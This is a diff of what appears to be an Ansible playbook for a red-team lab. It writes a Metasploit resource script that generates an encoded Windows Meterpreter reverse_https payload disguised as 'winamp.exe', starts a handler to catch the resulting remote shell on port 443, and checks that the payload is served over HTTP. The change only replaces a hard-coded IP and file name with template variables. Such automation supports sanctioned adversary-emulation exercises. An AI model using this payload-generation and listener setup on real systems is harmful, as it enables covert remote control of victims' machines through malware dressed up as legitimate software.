@@ -10,13 +10,13 @@
     dest: "/home/red/https-handler.rc"
     content: |
       use payload/windows/x64/meterpreter/reverse_https
-      set lhost 10.96.11.9
+      set lhost {{red_ip}}
       set lport 443
       set luri /session-id
-      generate -f exe -e x64/zutto_dekiru -o /home/red/payload/winamp.exe
+      generate -f exe -e x64/zutto_dekiru -o /home/red/payload/{{red_executable}}
       use exploit/multi/handler
       set payload windows/x64/meterpreter/reverse_https
-      set lhost 10.96.11.9
+      set lhost {{red_ip}}
       set lport 443
       set luri /session-id/
       exploit -j
@@ -37,7 +37,7 @@
 
 - name: Wait for python to serve file
   uri:
-    url: http://10.96.11.9:8080/winamp.exe
+    url: http://{{red_ip}}:8080/{{red_executable}}
     method: GET
     status_code: 200
     return_content: no
